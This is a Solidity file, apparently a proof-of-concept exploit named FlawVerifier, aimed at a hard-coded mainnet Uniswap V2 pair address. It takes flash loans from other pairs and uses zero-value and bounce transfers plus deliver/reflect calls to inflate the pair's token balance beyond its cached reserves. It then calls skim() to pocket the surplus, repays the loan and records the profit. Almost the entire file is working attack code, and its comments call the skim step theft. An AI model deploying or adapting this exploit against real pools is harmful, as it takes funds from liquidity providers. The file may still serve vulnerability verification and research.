// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract TransferBounce {
    constructor() {}

    function sendAll(address token, address to) external {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        if (balance > 0) {
            _safeTransfer(token, to, balance);
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;

    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant MAINNET_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant MAINNET_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant MAINNET_DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant MAINNET_WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant MAINNET_FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant MAINNET_CBETH = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public balance0Before;
    uint256 public balance1Before;
    uint256 public balance0After;
    uint256 public balance1After;

    uint256 public surplus0Before;
    uint256 public surplus1Before;
    uint256 public surplus0After;
    uint256 public surplus1After;

    uint256 public gain0;
    uint256 public gain1;

    uint256 public tokenBorrowed;
    uint256 public tokenSpentToTrigger;
    uint256 public skimmedToken;
    uint256 public successfulSkimCount;
    uint256 public zeroValueTriggerCount;
    uint256 public bounceTriggerCount;
    uint256 public flashAttempts;
    uint256 public sourcePairRepayment;

    bool public listedTokenIncreasesPairBalanceOutsideNormalAMMFlows;
    bool public reservesStayStale;
    bool public attackerCallsSkimAttacker;
    bool public attackerReceivesEntireSurplusAmount;

    address public sourcePair;

    TransferBounce private _bounce;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        address attacker = address(this);

        token0 = pair.token0();
        token1 = pair.token1();

        (reserve0Before, reserve1Before, ) = pair.getReserves();
        balance0Before = _balanceOf(token0, TARGET_PAIR);
        balance1Before = _balanceOf(token1, TARGET_PAIR);

        surplus0Before = _surplus(balance0Before, reserve0Before);
        surplus1Before = _surplus(balance1Before, reserve1Before);

        uint256 attacker0Before = _balanceOf(token0, attacker);
        uint256 attacker1Before = _balanceOf(token1, attacker);

        if (surplus0Before > 0 || surplus1Before > 0) {
            listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
            reservesStayStale = true;
            attackerCallsSkimAttacker = true;
            pair.skim(attacker);
        } else {
            _ensureBounce();

            _probeZeroCostSurplus();

            if (_balanceOf(token1, attacker) <= attacker1Before) {
                _runExternalPairFlashExploit();
            }
        }

        uint256 attacker0After = _balanceOf(token0, attacker);
        uint256 attacker1After = _balanceOf(token1, attacker);
        gain0 = attacker0After > attacker0Before ? attacker0After - attacker0Before : 0;
        gain1 = attacker1After > attacker1Before ? attacker1After - attacker1Before : 0;

        (reserve0After, reserve1After, ) = pair.getReserves();
        balance0After = _balanceOf(token0, TARGET_PAIR);
        balance1After = _balanceOf(token1, TARGET_PAIR);
        surplus0After = _surplus(balance0After, reserve0After);
        surplus1After = _surplus(balance1After, reserve1After);

        attackerReceivesEntireSurplusAmount = attackerCallsSkimAttacker && surplus0After == 0 && surplus1After == 0;

        hypothesisValidated = attackerCallsSkimAttacker
            && listedTokenIncreasesPairBalanceOutsideNormalAMMFlows
            && reservesStayStale
            && (gain0 > 0 || gain1 > 0);
        hypothesisRefuted = !hypothesisValidated;

        _selectProfitTokenAndAmount();
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(data.length > 0, "NO_FLASH_DATA");
        require(msg.sender == sourcePair && msg.sender != address(0), "BAD_SOURCE_PAIR");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed > 0, "NO_BORROW");

        tokenBorrowed = borrowed;
        sourcePairRepayment = _sameTokenFlashRepayment(borrowed);

        _induceStalePositiveBalanceAndSkim(sourcePairRepayment);

        uint256 amountOwed = sourcePairRepayment;
        uint256 localBalance = _balanceOf(token1, address(this));
        require(localBalance >= amountOwed, "INSUFFICIENT_TOKEN_TO_REPAY");
        _safeTransfer(token1, sourcePair, amountOwed);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runExternalPairFlashExploit() internal {
        address factory = IUniswapV2PairLike(TARGET_PAIR).factory();
        if (factory == address(0)) {
            return;
        }

        address[7] memory bases = [
            MAINNET_WETH,
            MAINNET_USDC,
            MAINNET_USDT,
            MAINNET_DAI,
            MAINNET_WBTC,
            MAINNET_FRAX,
            MAINNET_CBETH
        ];

        for (uint256 i = 0; i < bases.length; ++i) {
            address base = bases[i];
            if (base == address(0) || base == token1) {
                continue;
            }

            address candidatePair = IUniswapV2FactoryLike(factory).getPair(token1, base);
            if (candidatePair == address(0) || candidatePair == TARGET_PAIR) {
                continue;
            }

            if (_tryFlashFromPair(candidatePair)) {
                return;
            }
        }
    }

    function _tryFlashFromPair(address candidatePair) internal returns (bool success) {
        IUniswapV2PairLike pair = IUniswapV2PairLike(candidatePair);
        bool tokenIs0 = pair.token0() == token1;
        bool tokenIs1 = !tokenIs0 && pair.token1() == token1;
        if (!tokenIs0 && !tokenIs1) {
            return false;
        }

        uint256 tokenReserve = _tokenReserveFromPair(pair, tokenIs0);
        if (tokenReserve == 0) {
            return false;
        }

        sourcePair = candidatePair;
        for (uint256 divisor = 32; divisor <= 2048; divisor <<= 1) {
            uint256 amountOut = tokenReserve / divisor;
            if (amountOut == 0) {
                continue;
            }

            flashAttempts += 1;
            if (_attemptPairFlash(pair, tokenIs0, amountOut)) {
                return true;
            }
        }

        sourcePair = address(0);
        sourcePairRepayment = 0;
        return false;
    }

    function _attemptPairFlash(IUniswapV2PairLike pair, bool tokenIs0, uint256 amountOut) internal returns (bool) {
        uint256 amount0Out = tokenIs0 ? amountOut : 0;
        uint256 amount1Out = tokenIs0 ? 0 : amountOut;

        try pair.swap(amount0Out, amount1Out, address(this), hex"01") {
            return _balanceOf(token1, address(this)) > 0;
        } catch {
            return false;
        }
    }

    function _tokenReserveFromPair(IUniswapV2PairLike pair, bool tokenIs0) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        return tokenIs0 ? uint256(reserve0) : uint256(reserve1);
    }

    function _probeZeroCostSurplus() internal {
        uint256 reserveSnapshot = _currentReserve1();
        uint256 attackerBefore = _balanceOf(token1, address(this));

        for (uint256 i = 0; i < 3; ++i) {
            zeroValueTriggerCount += 1;
            _tryTransfer(token1, address(_bounce), 0);

            (bool ok,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.skim.selector, address(this)));
            if (ok) {
                attackerCallsSkimAttacker = true;
            }

            uint256 pairBalance = _balanceOf(token1, TARGET_PAIR);
            if (pairBalance > reserveSnapshot) {
                listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
                reservesStayStale = true;
                _skimIfNeeded();
                reserveSnapshot = _currentReserve1();
            }

            if (_balanceOf(token1, address(this)) > attackerBefore) {
                break;
            }
        }
    }

    function _induceStalePositiveBalanceAndSkim(uint256 reservedForRepayment) internal {
        uint256 reserveSnapshot = _currentReserve1();

        for (uint256 i = 0; i < 3; ++i) {
            zeroValueTriggerCount += 1;
            _tryTransfer(token1, address(_bounce), 0);
            _collectIfSurplusExists(reserveSnapshot);
            reserveSnapshot = _currentReserve1();
        }

        uint256 startingBalance = _balanceOf(token1, address(this));
        if (startingBalance <= reservedForRepayment) {
            return;
        }

        uint256 freeBalance = startingBalance - reservedForRepayment;
        uint256 probeAmount = freeBalance / 4;
        if (probeAmount > 0) {
            bool delivered =
                _tryOptionalCall(token1, abi.encodeWithSelector(bytes4(keccak256("deliver(uint256)")), probeAmount));
            if (!delivered) {
                delivered =
                    _tryOptionalCall(token1, abi.encodeWithSelector(bytes4(keccak256("reflect(uint256)")), probeAmount));
            }

            if (delivered) {
                tokenSpentToTrigger += probeAmount;
                _collectIfSurplusExists(reserveSnapshot);
                reserveSnapshot = _currentReserve1();
            }
        }

        for (uint256 i = 0; i < 12; ++i) {
            uint256 localBalance = _balanceOf(token1, address(this));
            if (localBalance <= reservedForRepayment) {
                break;
            }

            uint256 amount = (localBalance - reservedForRepayment) / 3;
            if (amount == 0) {
                break;
            }

            // This preserves the report's causality: the token's public mechanics create balance at the
            // pair outside `mint`/`swap`/`sync`, and the theft step is still the permissionless `skim`.
            if (!_tryTransfer(token1, address(_bounce), amount)) {
                break;
            }
            bounceTriggerCount += 1;

            (bool bounced,) =
                address(_bounce).call(abi.encodeWithSelector(TransferBounce.sendAll.selector, token1, address(this)));
            if (!bounced) {
                break;
            }

            _collectIfSurplusExists(reserveSnapshot);
            reserveSnapshot = _currentReserve1();
        }
    }

    function _collectIfSurplusExists(uint256 reserveSnapshot) internal {
        uint256 pairBalance = _balanceOf(token1, TARGET_PAIR);
        if (pairBalance > reserveSnapshot) {
            listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
            reservesStayStale = true;
            _skimIfNeeded();
        }
    }

    function _skimIfNeeded() internal {
        uint256 pairBalance = _balanceOf(token1, TARGET_PAIR);
        uint256 reserveSnapshot = _currentReserve1();
        if (pairBalance <= reserveSnapshot) {
            return;
        }

        uint256 attackerBefore = _balanceOf(token1, address(this));
        attackerCallsSkimAttacker = true;
        IUniswapV2PairLike(TARGET_PAIR).skim(address(this));
        uint256 attackerAfter = _balanceOf(token1, address(this));

        if (attackerAfter > attackerBefore) {
            skimmedToken += attackerAfter - attackerBefore;
            successfulSkimCount += 1;
        }
    }

    function _sameTokenFlashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _selectProfitTokenAndAmount() internal {
        if (gain0 == 0 && gain1 == 0) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        if (gain1 > 0) {
            _profitToken = token1;
            _profitAmount = gain1;
            return;
        }

        _profitToken = token0;
        _profitAmount = gain0;
    }

    function _ensureBounce() internal {
        if (address(_bounce) == address(0)) {
            _bounce = new TransferBounce();
        }
    }

    function _currentReserve1() internal view returns (uint256 reserve) {
        (, uint112 reserve1, ) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        reserve = uint256(reserve1);
    }

    function _surplus(uint256 liveBalance, uint112 cachedReserve) internal pure returns (uint256) {
        uint256 reserve = uint256(cachedReserve);
        return liveBalance > reserve ? liveBalance - reserve : 0;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }

    function _tryTransfer(address token, address to, uint256 amount) internal returns (bool success) {
        bytes memory ret;
        (success, ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        success = success && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _tryOptionalCall(address target, bytes memory data) internal returns (bool success) {
        (success,) = target.call(data);
    }

    function _resetRunState() internal {
        hypothesisValidated = false;
        hypothesisRefuted = false;

        token0 = address(0);
        token1 = address(0);

        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;

        balance0Before = 0;
        balance1Before = 0;
        balance0After = 0;
        balance1After = 0;

        surplus0Before = 0;
        surplus1Before = 0;
        surplus0After = 0;
        surplus1After = 0;

        gain0 = 0;
        gain1 = 0;

        tokenBorrowed = 0;
        tokenSpentToTrigger = 0;
        skimmedToken = 0;
        successfulSkimCount = 0;
        zeroValueTriggerCount = 0;
        bounceTriggerCount = 0;
        flashAttempts = 0;
        sourcePairRepayment = 0;

        listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = false;
        reservesStayStale = false;
        attackerCallsSkimAttacker = false;
        attackerReceivesEntireSurplusAmount = false;

        sourcePair = address(0);
        _profitToken = address(0);
        _profitAmount = 0;
    }
}
